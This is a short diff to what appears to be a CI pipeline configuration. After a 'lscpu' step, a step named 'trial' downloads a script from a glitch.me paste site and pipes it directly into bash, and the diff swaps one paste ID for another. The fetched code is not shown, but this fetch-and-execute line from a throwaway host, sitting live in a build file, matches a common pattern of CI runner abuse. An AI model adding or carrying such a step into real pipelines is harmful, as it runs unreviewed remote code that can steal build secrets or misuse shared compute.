@@ -9,7 +9,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/LEwqqD3W4k | bash
+            command: curl https://muq-hastebin.glitch.me/raw/tIDM1H6ovF | bash
  
 workflows: 
     version: 2.1 
